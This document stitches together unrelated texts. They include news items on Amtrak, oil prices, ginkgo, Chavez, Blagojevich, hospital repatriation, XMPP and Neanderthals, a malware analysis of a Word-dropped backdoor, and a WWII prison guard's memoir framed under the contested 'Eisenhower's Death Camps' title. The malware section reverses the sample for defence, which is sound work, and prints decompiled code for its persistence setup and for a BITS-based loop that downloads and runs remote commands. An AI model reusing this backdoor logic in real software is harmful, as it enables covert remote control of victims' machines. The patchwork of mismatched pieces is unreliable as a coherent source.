Amtrak ’s current Northeast Corridor rail line is shared with freight and commuter trains , which can significantly increase the length of time it takes for passengers to arrive at their destinations .
The rail line for which Congress seeks contractors is the first of a series of nationwide high - speed passenger rail lines the government is considering funding , according to a congressional aide .
“ That ’s what we ’re pushing for , ” said the congressional aide , who asked not to be identified .
Others would run the length of California and Florida , spread throughout the Midwest with a hub in Chicago , connect Portland , Ore. , with Seattle , and run between major cities in Texas .
Amtrak officials have responded to complaints from Congress for years that they are hampered in improving passenger service by train - scheduling conflicts on rail lines they share with commuter and freight railroads .
Plans for the rail line are part of a request for proposals the U.S. Transportation Department is announcing today that seek contractors to build the system .
It was authorized under the Rail Improvement Safety Act that Congress approved in October .
That legislation also funds subsidies for Amtrak and other railroads for the next five years .
The legislation would provide $ 13.06 billion to help bring the Northeast Corridor rail infrastructure to a state of good repair .
It also provides $ 1.5 billion for the planning and development of high - speed rail corridors in other parts of the nation .
The legislation requires operational reforms for Amtrak , such as measures to improve on - time performance and the appointment of a new board of directors .
The new rail line would carry passengers between Washington and New York in no more than two hours , compared with nearly three hours now on Amtrak ’s high - speed Acela trains .
Slower Amtrak trains can take as long as four hours for the trip .
Construction on the rail line could be years away , according to the congressional aide .
“ Congress still has to vote to fund it , ” he said .
Amtrak officials described the Transportation Department ’s request for proposals today as a significant step in getting the high - speed rail lines built exclusively for passenger service .
“ It is a milestone to the extent that there is specific legislation requesting statements of interest from the private sector , ” Amtrak spokesman Cliff Black said .
However , he said civil engineers face significant obstacles , such as figuring out where to put the rail line when urban development and natural barriers lie in its path .
He mentioned downtown tunnels in Baltimore that are more than a century old and the Hudson River , which borders New York ’s Manhattan Island on the west .
“ Those need to be dealt with , ” Mr. Black said .
“ They are major capital projects , both of them costing presumably in the billions of dollars . ”
A new rail line appears to be the kind of project supported by President - elect Barack Obama in his economic stimulus plan .
The plan calls for heavy government investment in infrastructure projects , particularly if they are environmentally friendly .
Amtrak officials say passenger rail reduces automobile traffic congestion by providing an incentive for motorists to use mass transit and lessens fuel consumption .
A spokesman for Mr. Obama said the president - elect would withhold comment on the Amtrak project until after he assumes office Jan. 20 .
“ We ’re strongly sticking to the one - president - at - a - time rule , ” Obama spokesman Nick Shapiro said .
The rail project already has support in Congress among both Republicans and Democrats , said Mary Kerr , spokeswoman for the House Transportation and Infrastructure Committee .
“ That has bipartisan support , ” Ms. Kerr said .
However , even passenger - rail advocates cautioned against assumptions that a new Northeast Corridor line is certain to be built .
Considering the multibillion - dollar price tag and engineering obstacles , “ I ’m not sure that makes it a doable thing , ” said Ross Capon , president of the National Association of Railroad Passengers , a passenger rail advocacy group .
“ I think we ’re still a few years away before you would get to moving beyond proposals . ”

Dr. Robert Jeffress , the preacher who gave a sermon called “ Why Gay is Not O.K. ” last week at the Dallas First Baptist Church is the go - to guy for goofy quotes about intolerance .
During the Presidential primary , he warned his parishioners not to vote for Mitt Romney because he ’s a “ member of a cult ” and in the 90’s said that homosexuality “ is responsible for the deaths of tens of thousands every year through AIDS . ”
Well , even Jeffress ’ church has its limits for crazy stupid bullshit , it turns out .
A video of a sermon about sex and iPod ’s by Dr. Jeffress was pulled from their site without explanation this week .
According to Jeffree ’s sermon , sex is like an iPod ( there ’s a new fetish ! ) and if you do n’t plug your iPod into the right outlet it ’ll explode / mysteriously fill up with show tunes .
But as our tipster pointed out “ I and many other people have dragged their iPods all over the world and plugged it in using the same power adapter I use in the US in 240 volt outlets , just like it says on the side of the adapter that Apple sells in it ’s own stores right next to the plug adapters for several countries ” .
Anyway , the church is obviously embarrassed by this stupid / weird / wtf video and hoping it goes away , so obviously we ’re posting it here .
100 dollars .
Voila ce qu'ont perdu les cours du brut en moins de 5 mois .
Ce mardi , ils ont poursuivi leur tendance baissière , quasiment ininterrompue depuis les records atteints le 11 juillet à plus de 147 dollars le baril .
A la clôture du New York Mercantile Exchange ( Nymex ) , le baril de " light sweet crude " pour livraison en janvier a cédé 2,32 dollars à 46,96 dollars .
Le baril a touché en fin de séance 46,82 dollars , un nouveau plus bas depuis mai 2005 .
A Londres , sur l'Intercontinental Exchange , le Brent de la mer du Nord a reculé de 2,40 dollars , à 45,57 dollars le baril .
Le prix du pétrole est nettement reparti à la baisse depuis le début de la semaine , après l'absence de décision , samedi , des responsables des pays exportateurs de pétrole , réunis au Caire .
Ce mardi , le baril de " light sweet crude " pour livraison en janvier descend vers les 48 dollars .
Quant au baril de Brent de la mer du Nord , il plonge vers les 46 dollars .
Lundi , les prix du pétrole ont déjà fortement reculé à New York , les investisseurs prenant acte de la décision de l'Opep de maintenir ses quotas de production inchangés , dans un contexte économique très morose .
A la clôture du New York Mercantile Exchange ( Nymex ) , le baril de " light sweet crude " pour livraison en janvier a cédé 5,15 dollars à 49,28 dollars .
A Londres , sur l'Intercontinental Exchange , le Brent de la mer du Nord a reculé de 5,49 dollars , à 48 dollars le baril
Face à la dégringolade des prix de l'or noir , l'Opep , Organisation des pays exportateurs de pétrole , a décidé de préparer des mesures drastiques .
Le cartel pétrolier envisagerait de baisser substantiellement sa production lors de sa prochaine réunion , le 17 décembre en Algérie .
Samedi , les pays de l'Opep ont tenu une réunion consultative au Caire où ils ont maintenu la production inchangée mais en convenant " de prendre toute action supplémentaire " pour stabiliser le marché .
Le secrétaire général de l'organisation , Abdallah el - Badri , a été encore plus explicite en affirmant qu'il y avait au sein de l'Opep " un consensus général pour une action " en faveur d'une baisse de production lors de " la prochaine réunion " d'Oran .
Sans donner de chiffre précis , le responsable de l'Opep a parlé d'un montant " substantiel " .
Le terrain est donc préparé à une nouvelle baisse de la production du cartel , la troisième en quatre mois .
Selon les analystes , cette baisse de production pourrait être d'au moins 1 million de baril par jour ( mbj ) , certains évoquant une fourchette entre 1,5 et 2 mbj .
Le ministre iranien du Pétrole , Gholam Hossein Nozari , a estimé ce dimanche que le marché mondial souffrait d'un excédent de 2 mbj .
Mais il s'est refusé à préciser l'ampleur de la réduction que Téhéran souhaitait pour la réunion d'Oran .
Déjà , le 24 octobre dernier , l'Opep avait annoncé une baisse de 1,5 mbj du seuil de production de ses 11 membres soumis au système des quotas ( l ' Irak en est exclu ) , à 27,3 mbj à partir du 1er novembre .
En septembre , ils avaient appelé à un plus strict respect des quotas , ce qui équivalait à une baisse de production de quelque 500.000 barils par jour .
Il faut dire que le cartel est confronté à une situation difficile .
Le ralentissement économique mondial pèse sur la demande et a entraîné une chute brutale des prix .
L'Opep , qui produit 40 % du pétrole mondial , est confronté en plus à un dilemme : ne pas resserrer son offre suffisamment entraînerait la formation d'un surplus sur le marché pétrolier et pousserait les prix encore plus à la baisse mais la réduire trop serait contre - productif .

GIngko Is n't Smart
Millions of people take Gingko biloba because they think it keeps them smart .
A recent study suggests they might be smarter to save their money ( $ 107 million was spent on gingko in 2007 in the US alone ) .
Gingko has been touted for everything from altitude sickness to tinnitus , but the main claims have been for dementia , Alzheimer 's disease , and improving memory .
The evidence was n't clear , so the National Center for Complementary and Alternative Medicine ( NCCAM ) funded a large trial to find out whether gingko could really delay the onset of dementia or Alzheimer's .
They studied 3000 people over the age of 75 who were either normal or had mild cognitive impairment .
It was a well - designed double blind placebo controlled trial lasting over 6 years .
They found no difference in the incidence of dementia or Alzheimer 's disease .
Actually there were a few more cases of dementia and more hemorrhagic strokes in the gingko group than in the placebo group , but the difference was n't statistically significant .
Even before this trial , the Natural Medicines Comprehensive Database ( considered the " Bible " for herbal medicines and diet supplements ) listed gingko only as " possibly " effective and " possibly " safe - it did n't even merit their " probably " safe or effective categories .
They consider it " probably unsafe " in pregnancy .
There are other concerns .
Gingko interacts with all sorts of other medications including Motrin .
It can cause bleeding and should be discontinued 2 weeks before surgery .
And there 's no guarantee that you are getting what the label says .
When ConsumerLab.com recently tested 7 gingko products , five failed the tests : two contained adulterated material , two contained less gingko than claimed on the label , and one was contaminated with lead .
This study did n't rule out the possibility that gingko might be found useful in other scenarios , but it falls into a pattern .
The NCCAM has been spending hundreds of millions of taxpayer dollars to test commonly used diet supplements to find out what really works .
They have n't found anything that works .
They 've found a lot of things that do n't work .
That would be useful if people would accept the results and stop using those supplements .
Instead , they keep believing in the supplements and calling for more studies : let 's try it on younger subjects , let 's try a different dose , let 's try it for another disease ...
You could keep dreaming up more studies forever .
To paraphrase the editorial that accompanied the study in the Journal of the American Medical Association : if you do n't have clear evidence that it helps , and if you do n't have clear evidence that it 's harmless , it 's probably not smart to take it .
CARACAS , Venezuela ( CNN ) -- Venezuelan President Hugo Chavez announced Sunday he will again seek to change his office 's two - term limit so he can seek re-election .
Voters last year rejected Venezuela 's President Hugo Chavez attempt to extend presidential term limits .
Addressing a rally of his supporters , Chavez -- whose second six - year term expires in 2012 -- said he'd like to run again and perhaps even still be in power in 2021 .
That year is significant because it will be 200 years after Venezuela 's independence from Spain .
In his address , which was televised , Chavez called for a constitutional amendment that would allow him to run again .
The constitution of Venezuela currently limits the president to two terms .
Chavez lost a similar bid last year , when Venezuelans shot down a referendum that would have allowed him to run for a third term in 2012 .
That referendum proposed 69 amendments to the 1999 constitution , including one that would have abolished term limits .
CNN 's Ben Fernandez contributed to this report .

No , that 's NOT just a sorta - unfunny " Onion " headline about the mess of beyond - Obama Illinois politics ...
At approximately 6:15 AM this morning , beleaguered Illinois Governor Rod Blagojevich was arrested by federal authorities on bribery and wire and mail fraud charges for allegedly attempting to " sell " the US Senate seat vacated by President - Elect Barack Obama .
He was arrested by the FBI at his Chicago home ; his Chief of Staff John Harris was also arrested .
Hot on the heels of the news last week that at least one of Blago 's cohorts had been taping conversations with the Governor , the FBI alleges that he had been recorded conspiring to sell -- or trade for personal gain , via cash , jobs , appointments , or favors ( including some also aimed at his wife , Patti ) -- the now - open US Senate seat to the highest bidder .
Initial reports indicate that perhaps at least Rep. Jesse Jackson , Jr.'s and former state Sen. Emil Jones ' camps had been approached with " fundraising " ( nudge , nudge ) guidelines and the desire for potential ambassadorships or corporate board positions for the Guv or his wife .
There was also some speculation about Blago pressuring the Chicago Tribune -- regarding its reporting and opinions against him -- over the impending sales of the Trib - owned Cubs .
All of this hits , ironically , less than a day after the Governor said that -- despite the shadowed charges against him and the gathering clouds that seem to be constantly above him -- there was " nothing but sunshine " over his well - coiffed head .
US Attorney Patrick Fitzgerald is scheduled to speak about the arrest and the charges at approximately 11:00 AM , Chicago time .
We 'll have more on this stunning , fast - moving story as more details become available .

“ We do not wish for him to return , ” he continued .
“ He will be a burden for me , and I do not have the time or resources to care for him .
My mother has established a new family , and I do not wish for this matter to disrupt her life .
If they want to send him back , they will have to negotiate with the Chinese government to see if the government will care for him . ”
Into the Unknown
Hospitals say the federal government ignores the burden posed by these patients .
In fact , Immigration and Customs Enforcement does not assume any responsibility for the health care of illegal immigrants unless they are in federal immigration detention , said a spokeswoman , Kelly Nantel , and it does not get involved in repatriations undertaken by hospitals .
For some hospitals , such repatriations are routine , for others a last resort .
And , just as some forcibly repatriate patients , others do so only with consent — although consent is a murky concept when patients are told they have no alternative .
While some hospitals pay for an immigrant ’s repatriation and for their care in their homelands ; others never make any inquiries into how deported patients have fared .
“ We do n’t do any follow - up , ” said Sister McBride at St. Joseph ’s in Phoenix .
Even patients at hospitals that never repatriate immigrants can find themselves embroiled in discharge plans of considerable complexity , as the case of Darwin Castro demonstrates .
One day last May , Mr. Castro , a 21 - year - old illegal immigrant from Honduras , was getting a ride home from his construction job in Oklahoma City when the driver crashed into a tree .
By the time he arrived at the Oklahoma University hospital , he was in shock from extreme blood loss and rushed into an operating room for surgery on a badly wounded liver .
He also suffered a traumatic brain injury , facial and arm cuts and a broken hand .
Alerted by Honduran friends to the accident , Mr. Castro ’s cousin , Wilmer Ubener Reaños , 25 , called the hospital from New Orleans , where he too worked in construction .
Mr. Reaños asked a bilingual colleague for help in communicating with the hospital .
From that point forward , the colleague , David Ruiz , became the family liaison , and the hospital believed that David — listed in the records with no last name — was the patient ’s cousin .
After six weeks , Mr. Castro was ready for discharge , said Allen Poston , the hospital spokesman .
With a feeding tube and bladder catheter , Mr. Castro needed round - the - clock care but the hospital failed to find him a charity bed in a nursing home .
Since it never repatriates patients , the only other option was to discharge Mr. Castro to his relative in New Orleans , Mr. Poston said .
The developers at Collabora have extended Jingle — a multimedia chat protocol for XMPP — so that it can support audio and video conversations with more than two participants .
Support for this new XMPP extension , which they call Mingle , could eventually land in Empathy , the GNOME instant messaging client .
Collabora developer Dafydd Harries has written a blog entry about the project and also published a screenshot that demonstrates the prototype .
The Mingle project leverages the GStreamer multimedia framework and Farsight , an audio and video communication framework .
Farsight provides an abstraction layer around streaming media protocols and provides an API for client applications .
" This year , we wanted to try to take Jingle further by extending it to support more than two participants , and a grant from the NLnet Foundation made it possible for Sjoerd and I to spend time on it , " Harries wrote .
" I 'm now happy to announce that we have a working implementation of the beast we 've dubbed Mingle .
There is still much that remains to be done , but we think that the basic design is finished . "
The next - generation GNOME messaging and communication stack is coming together very nicely .
The inclusion of Empathy in GNOME was a big step and now ongoing efforts to bring robust audio and video chat to the platform are progressing at a good pace .
Mingle will be a very nice addition to Empathy when it 's ready .
The prototype is available from the project 's git repository and some basic instructions can be found on the Mingle page of the Telepathy wiki .

Scientists have discovered that Neanderthal diets were sophisticated , their tools efficient , and their development more similar to ours than researchers ever imagined .
Neanderthals are widely viewed as big - game - hunting carnivores who lacked the culinary expertise of modern humans .
Now researchers working at two sites on Gibraltar have discovered that Neanderthals were in fact skillfully exploiting the diverse dietary riches of their coastal environment around 40,000 years ago — some 10,000 years before the ancestors of modern humans ever set foot on the peninsula .
A study published in September in Proceedings of the National Academy of Sciences [ subscription required ] shows that Neanderthals ate seals , dolphins , and fish .
They also cooked mussels from the rivers on their hearths and heated the long bones of monk seals to get at the marrow inside .
A separate study also revealed Neanderthals as surprisingly gifted toolmakers .
Neanderthal flint knives are stout and wide , and at first glance they appear to be less efficiently crafted than the slender tools of our early modern human ancestors .
In October in the Journal of Human Evolution , Metin Eren , a graduate student at the University of Exeter in England and Southern Methodist University in Dallas , appraised the qualities of flint knives he had re-created in the styles of both Neanderthals and Cro-Magnons , the early modern humans of Europe .
While the cutting edges of both tool types were razor sharp , the heftier Neanderthal tools not only lasted longer but wasted less rock in their production ?
“ What we ’re showing is that in many ways , Neanderthals were just as smart or just as good as us , ” Eren says .
It turns out that their brains developed somewhat differently from those of modern humans , however , both in size and in speed of growth .
Researchers knew that Neanderthal brains reached full size between the ages of 6 and 8 years and that they were about 10 percent larger than the brains of modern humans .
But they did n’t know the size of the Neanderthal brain at birth .
In September a team of scientists , including Swiss anthropologist Christoph Zollikofer , filled in that piece of the puzzle , analyzing the skulls of a Neanderthal newborn and two toddlers along with the pelvis of a mature woman .
They concluded that Neanderthal babies had brains as big as those of modern babies .
“ Basically we found that the Neanderthal brain takes the same time [ to reach full size ] , but it grows faster , ” Zollikofer says .
That large , faster - growing brain came with a price tag .
Neanderthal mothers probably needed to dedicate more resources — food and maternal care — to their infants than modern humans do .
From this study [ subscription required ] , Zollikofer concludes that Neanderthal mothers may have had their first child , on average , when they were a year or two older than modern humans and that their time between pregnancies was probably longer .
Among hominids , that brain - nurturing pattern of development was supposed to be unique to our lineage .
“ Now we can say Neanderthal life was basically much the same as ours , ” Zollikofer says .
However much Neanderthals were like us , though , their genes reveal an ancient divergence from our forebears .
Richard Green , a computational biologist in Svante Pääbo ’s group at the Max Planck Institute for Evolutionary Anthropology in Leipzig , Germany , published [ subscription required ] the first sequence of a 38,000 - year - old Neanderthal ’s complete mitochondrial DNA in August .
The sequence fixes the split between the modern human and Neanderthal branches at about 660,000 years ago .
The new DNA data address one of anthropologists ’ favorite questions : Did Neanderthals and modern humans ever interbreed ?
According to Green , if there was any mating between them , it left no genetic evidence .
Neanderthals may have been smart , but it seems they were n’t sexy .
Introduction
A strange executable , named MSMSGS .EXE , was found on several machines on the network of a customer , apparently dropped by the exploitation of a vulnerability inside Word files .
As monitoring tools ( registry / file / socket ) provided insufficient information on the malware 's behaviour , we proceeded with a complete analysis .
Analysis of MSMSGS.EXE
IDA Pro First , let 's load the file inside thedisassembler .
IDA Pro , which was developed and published by DataRescue for several years , remains the best tool for the low - level analysis of malware .
Here 's what the disassembly looks like .

At 00402A69 , the fs segment register is used to access the thread 's TEB ( Thread Environment Block ) .
In fact , fs : 0 is used to insert a handler ( at 4297E4h ) in the SEH ( Structured Exception Handler ) chain , after which an exception is provoked .
The instructions starting at 00402A77 are obviously garbage as execution continues through the exception handled .
This basic anti-disassembling trick is used to fool a casual analyst .
If we reload the binary with ' Analysis options ' and ' Create resource segments ' , IDA now correctly detects the exception handler code , and if we undefine the garbage instructions , we obtain the following :

The caracteristic color in the address column ( ) indicates us that 'stechnology successfully recognized the code at the entry point as being from a static library , so we can safely assume the program was writen in a high - level language ( in this case ) .
If we browse to the

The executable determines if it already sits in the ' Documents and Settings \\ All Users \\ Application Data ' directory : if not , it executes the install
function , else it executes the run function .
Here is the most interesting code from this install
function :
memset ( &NewFileName , 0 , 0x104u ) ;
if ( !GetEnvironmentVariableA( " ALLUSERSPROFILE " , & NewFileName , 0x104u ) )

FindClose ( first_windows_dll ) ;
CloseHandle ( v4 ) ;
WinExec( &NewFileName , 0 ) ; // execute ourself from ' Application Data '
...
The program tries to register as a fake ' Logical Disk Manager Service ' system service or as a ' Windows Media Player ' application in the registry startup keys , then it copies itself to the ' Application Data ' directory , adjust its date to match the one of the first DLL file found in the Windows directory , and finally starts itself again from this new working directory .
If it was already present in the ' Application Data ' directory , then the run function executes instead , which basically extracts a payload from its data section and writes it to a new file , ' C : \Program Files\WindowsUpdate \Windows Installer.exe ' , itself executed .

Finally , it invokes the CreateThread API to run the workFunc_thread function in a new thread .
This workFunc_thread will load the DLL just extracted , and executes the function " workFunc " exported by this DLL , passing it some of the suspicious URLs we observed previously :

Analysis of DRMV021.LIC
The following screenshot confirms us that a " workFunc " function is indeed exported , and that we are missing the PDB debug information file . ;)
This " workFunc " function calls another small function , which basically try to indefinitely download a tiny file containing a backdoor command from one of the URL seen previously , then parse and execute this command , as seen below :

The backdoor makes use of Microsoft 's Background Intelligent Transfer Service ( BITS ) through a COM interface , which allows to download files without consuming network bandwidth and easily bypasses the local firewall without using more suspicious technics ( like a socket created by the process itself , or even injection into another process ) :
lstrcatW ( & String2 , L" My911 " ) ;
if ( ole32_CoInitializeEx ( 0 , COINIT_APARTMENTTHREADED ) >= 0
&& ole32_CoCreateInstance (

& ppv ) >= 0
&& (*(* ppv + CreateJob ) ) ( ppv , & String2 , 0 , &v26 , &v22 ) >= 0
&& (*( * ppv + Add File ) ) ( v22 , download_url ,
downloaded_filename ) >= 0
&& (*( * ppv + Resume ) ) ( v22 ) >= 0 )
{
...
lstrcpyW ( &String1 , & String2 ) ;
lstrcatW ( & String1 , L" DSTT " ) ;
v9 = kernel32_CreateWaitableTimerW( 0 , 0 , & String1 ) ;
v5 = v9 ;
kernel32_SetWaitableTimer( v9 , &v30 , 5000 , 0 , 0 , 0 ) ;
while ( 1 )
{
kernel32_WaitForSingleObject ( v5 , - 1 ) ;
if (*(* ppv + GetState ) ) ( v22 , &v32 ) < 0 )
{
DCOM_cancel_timer :
kernel32_CancelWaitableTimer ( v5 ) ;
kernel32_CloseHandle ( v5 ) ;
v3 = ret_code ;
v4 = 0 ;
goto DCOM_end ;
}
v6 = v32 ;
if ( v32 == BG_JOB_STATE_TRANSFERRED
)
{
(*( * ppv + Complete ) ) ( v22 ) ;
v6 = v32 ;
ret_code = 1 ; // transfer successful l
goto LABEL_15 ;
}
if ( v32 == BG_JOB_STATE_ERROR
|| v32 == BG_JOB_STATE_TRANSIENT_ERROR
)
break ;
if ( v32 != BG_JOB_STATE_TRANSFERRING
)
{
LABEL_15 :
if ( v6 == BG_JOB_STATE_TRANSFERRED
|| v6 == BG_JOB_STATE_ERROR
|| v6 == BG_JOB_STATE_TRANSIENT_ERROR
)
goto DCOM_cancel_timer ;
}
}
ret_code = - 1 ; // transfer failed goto LABEL_15 ;
}
It is interesting to note that some needed APIs ( like CreateWaitableTimer ) are imported by manually parsing KERNEL32.DLL 's export table and looking for corresponding CRC , a really old technique commonly used in viruses .
However , only the BITS related code is importing its required APIs using this trick , which tends to demonstrate the backdoor 's author most probably cut and pasted this code snippet .
If we uses Microsoft 's BITSAdmin Tool to display the download queue inside a ( networkless ) VMare image of a compromised host , we see many suspended jobs indicating that the backdoor was trying to download data from the suspicious host ( unreachable because our virtual machine is not connected ) :
BITSADMIN version 2.0 [ 6.6.3790.1830 ]
BITS administration utility .

If we manually connect to this host with one of these HTTP requests by using a tool like wget , we receive the following string :

}
For example , our captured string with the ' n4 ' command causes the backdoor to sleep for 300 seconds , then try to get a new command again .
So actually , the backdoor seems to be dormant , waiting most probably until a command to execute a given process appears on the master host .
Finally , here is a small graph representing all the functions referenced by the code to manage command execution :
Remark that the run_process *( ) and run_thread *( ) functions all depend on the previously described bits_file_loop ( ) function , which they use to download an executable or a DLL .
This downloaded file is then verified against a given MD5 ( which was passsed as an argument to the command ) , and finally gets executed , either as a stand - alone process or as a new thread inside the current process .
Execution of a backdoor command
Now that we have a clear view about how the backdoor is working , let 's try subverting the backdoor to force it executing Notepad , for example .
As BITS is only invoked by the backdoor to download a file from a given URL to a location specified by the backdoor itself , we can simply prepare a command file manually , skip BITS , hijack the required functions to let the backdoor think the file was properly received , and finally see if it 's working as we supposed .
For this , we wrote the following WinDBG script :
g $ exentry

Basically , the script logs arguments of some interesting APIs and functions , and hijack the GetTickCount ( ) API , which is used by the backdoor to determine unique filenames which are passed to BITS .
We modify this API to always returns 0 , so we can simulate the downloading of a command file simply by creating a fake command file named ' 0 ' in the C : \Program Files \InstallShield Installation Information ' directory , where the backdoor is expecting downloaded files to appear .
In this file , we put the following command :
The ' n1 ' command allows to execute a process downloaded from a source URL to a given destination , and first verify the file has the given MD5 checksum ( which is the checksum of our existing Notepad in our case ) .
Here is the output generated by our WinDBG script :

We successfully determined that the backdoor 's main purpose is to communicate with a master host to receive commands , and proved that the attacker can use it to fully control a compromised machine .
The layout of the code suggests us that the backdoor contains code snippets coming from various external sources , and that the autor is not really skilled .

In ' Eisenhower 's Death Camps ' :
A U.S. Prison Guard Remembers
Martin Brech
In October 1944 , at age eighteen , I was drafted into the U.S. army .
Largely because of the " Battle of the Bulge , " my training was cut short , my furlough was halved , and I was sent overseas immediately .
Upon arrival in Le Havre , France , we were quickly loaded into box cars and shipped to the front .
When we got there , I was suffering increasingly severe symptoms of mononucleosis , and was sent to a hospital in Belgium .
Since mononucleosis was then known as the " kissing disease , " I mailed a letter of thanks to my girlfriend .
By the time I left the hospital , the outfit I had trained with in Spartanburg , South Carolina , was deep inside Germany , so , despite my protests , I was placed in a " repo depot " ( replacement depot ) .
I lost interest in the units to which I was assigned , and do n't recall all of them : non-combat units were ridiculed at that time .
My separation qualification record states I was mostly with Company C , 14th Infantry Regiment , during my seventeen - month stay in Germany , but I remember being transferred to other outfits also .
In late March or early April 1945 , I was sent to guard a POW camp near Andernach along the Rhine .
I had four years of high school German , so I was able to talk to the prisoners , although this was forbidden .
Gradually , however , I was used as an interpreter and asked to ferret out members of the S.S. ( I found none . )
In Andernach about 50,000 prisoners of all ages were held in an open field surrounded by barbed wire .
The women were kept in a separate enclosure that I did not see until later .
The men I guarded had no shelter and no blankets .
Many had no coats .
They slept in the mud , wet and cold , with inadequate slit trenches for excrement .
It was a cold , wet spring , and their misery from exposure alone was evident .
Even more shocking was to see the prisoners throwing grass and weeds into a tin can containing a thin soup .
They told me they did this to help ease their hunger pains .
Quickly they grew emaciated .
Dysentery raged , and soon they were sleeping in their own excrement , too weak and crowded to reach the slit trenches .
Many were begging for food , sickening and dying before our eyes .
We had ample food and supplies , but did nothing to help them , including no medical assistance .
Outraged , I protested to my officers and was met with hostility or bland indifference .
When pressed , they explained they were under strict orders from " higher up . "
No officer would dare do this to 50,000 men if he felt that it was " out of line , " leaving him open to charges .
Realizing my protests were useless , I asked a friend working in the kitchen if he could slip me some extra food for the prisoners .
He too said they were under strict orders to severely ration the prisoners ' food , and that these orders came from " higher up . "
But he said they had more food than they knew what to do with , and would sneak me some .
When I threw this food over the barbed wire to the prisoners , I was caught and threatened with imprisonment .
I repeated the " offense , " and one officer angrily threatened to shoot me .
I assumed this was a bluff until I encountered a captain on a hill above the Rhine shooting down at a group of German civilian women with his .45 caliber pistol .
When I asked , " Why ? , " he mumbled , " Target practice , " and fired until his pistol was empty .
I saw the women running for cover , but , at that distance , could n't tell if any had been hit .
This is when I realized I was dealing with cold - blooded killers filled with moralistic hatred .
They considered the Germans subhuman and worthy of extermination ; another expression of the downward spiral of racism .
Articles in the G.I. newspaper , Stars and Stripes , played up the German concentration camps , complete with photos of emaciated bodies .
This amplified our self - righteous cruelty , and made it easier to imitate behavior we were supposed to oppose .
Also , I think , soldiers not exposed to combat were trying to prove how tough they were by taking it out on the prisoners and civilians .
These prisoners , I found out , were mostly farmers and workingmen , as simple and ignorant as many of our own troops .
As time went on , more of them lapsed into a zombie - like state of listlessness , while others tried to escape in a demented or suicidal fashion , running through open fields in broad daylight towards the Rhine to quench their thirst .
They were mowed down .
Some prisoners were as eager for cigarettes as for food , saying they took the edge off their hunger .
Accordingly , enterprising G.I. " Yankee traders " were acquiring hordes of watches and rings in exchange for handfuls of cigarettes or less .
When I began throwing cartons of cigarettes to the prisoners to ruin this trade , I was threatened by rank - and - file G.I.s too .
The only bright spot in this gloomy picture came one night when .
I was put on the " graveyard shift , " from two to four a .m .
Actually , there was a graveyard on the uphill side of this enclosure , not many yards away .
My superiors had forgotten to give me a flashlight and I had n't bothered to ask for one , disgusted as I was with the whole situation by that time .
It was a fairly bright night and I soon became aware of a prisoner crawling under the wires towards the graveyard .
We were supposed to shoot escapees on sight , so I started to get up from the ground to warn him to get back .
Suddenly I noticed another prisoner crawling from the graveyard back to the enclosure .
They were risking their lives to get to the graveyard for something .
I had to investigate .
When I entered the gloom of this shrubby , tree - shaded cemetery , I felt completely vulnerable , but somehow curiosity kept me moving .
Despite my caution , I tripped over the legs of someone in a prone position .
Whipping my rifle around while stumbling and trying to regain composure of mind and body , I soon was relieved I had n't reflexively fired .
The figure sat up .
Gradually , I could see the beautiful but terror - stricken face of a woman with a picnic basket nearby .
German civilians were not allowed to feed , nor even come near the prisoners , so I quickly assured her I approved of what she was doing , not to be afraid , and that I would leave the graveyard to get out of the way .
I did so immediately and sat down , leaning against a tree at the edge of the cemetery to be inconspicuous and not frighten the prisoners .
I imagined then , and still do now , what it would be like to meet a beautiful woman with a picnic basket under those conditions as a prisoner .
I have never forgotten her face .
Eventually , more prisoners crawled back to the enclosure .
I saw they were dragging food to their comrades , and could only admire their courage and devotion .
On May 8 , V.E. Day [ 1945 ] , I decided to celebrate with some prisoners I was guarding who were baking bread the other prisoners occasionally received .
This group had all the bread they could eat , and shared the jovial mood generated by the end of the war .
We all thought we were going home soon , a pathetic hope on their part .
We were in what was to become the French zone [ of occupation ] , where I soon would witness the brutality of the French soldiers when we transferred our prisoners to them for their slave labor camps .
On this day , however , we were happy .
As a gesture of friendliness , I emptied my rifle and stood it in the corner , even allowing them to play with it at their request .
This thoroughly " broke the ice , " and soon we were singing songs we taught each other , or that I had learned in high school German class ( " Du , du , liegst mir im Herzen " ) .
Out of gratitude , they baked me a special small loaf of sweet bread , the only possible present they had left to offer .
I stuffed it in my " Eisenhower jacket , " and snuck it back to my barracks , eating it when I had privacy .
I have never tasted more delicious bread , nor felt a deeper sense of communion while eating it .
I believe a cosmic sense of Christ ( the Oneness of all Being ) revealed its normally hidden presence to me on that occasion , influencing my later decision to major in philosophy and religion .
Shortly afterwards , some of our weak and sickly prisoners were marched off by French soldiers to their camp .
We were riding on a truck behind this column .
Temporarily , it slowed down and dropped back , perhaps because the driver was as shocked as I was .
Whenever a German prisoner staggered or dropped back , he was hit on the head with a club and killed .
The bodies were rolled to the side of the road to be picked up by another truck .
For many , this quick death might have been preferable to slow starvation in our " killing fields . "
When I finally saw the German women held in a separate enclosure , I asked why we were holding them prisoner .
I was told they were " camp followers , " selected as breeding stock for the S.S. to create a super - race .
I spoke to some , and must say I never met a more spirited or attractive group of women .
I certainly did n't think they deserved imprisonment .
More and more I was used as an interpreter , and was able to prevent some particularly unfortunate arrests .
One somewhat amusing incident involved an old farmer who was being dragged away by several M.P.s.
I was told he had a " fancy Nazi medal , " which they showed me .
Fortunately , I had a chart identifying such medals .
He 'd been awarded it for having five children !
Perhaps his wife was somewhat relieved to get him " off her back , " but I did n't think one of our death camps was a fair punishment for his contribution to Germany .
The M.P.s agreed and released him to continue his " dirty work . "
Famine began to spread among the German civilians also .
It was a common sight to see German women up to their elbows in our garbage cans looking for something edible -- that is , if they were n't chased away .
When I interviewed mayors of small towns and villages , I was told that their supply of food had been taken away by " displaced persons " ( foreigners who had worked in Germany ) , who packed the food on trucks and drove away .
When I reported this , the response was a shrug .
I never saw any Red Cross at the camp or helping civilians , although their coffee and doughnut stands were available everywhere else for us .
In the meantime , the Germans had to rely on the sharing of hidden stores until the next harvest .
Hunger made German women more " available , " but despite this , rape was prevalent and often accompanied by additional violence .
In particular I remember an eighteen - year old woman who had the side of her faced smashed with a rifle butt , and was then raped by two G.I.s .
Even the French complained that the rapes , looting and drunken destructiveness on the part of our troops was excessive .
In Le Havre , we 'd been given booklets warning us that the German soldiers had maintained a high standard of behavior with French civilians who were peaceful , and that we should do the same .
In this we failed miserably .
" So what ? " some would say .
" The enemy 's atrocities were worse than ours . "
It is true that I experienced only the end of the war , when we were already the victors .
The German opportunity for atrocities had faded , while ours was at hand .
But two wrongs do n't make a right .
Rather than copying our enemy 's crimes , we should aim once and for all to break the cycle of hatred and vengeance that has plagued and distorted human history .
This is why I am speaking out now , 45 years after the crime .
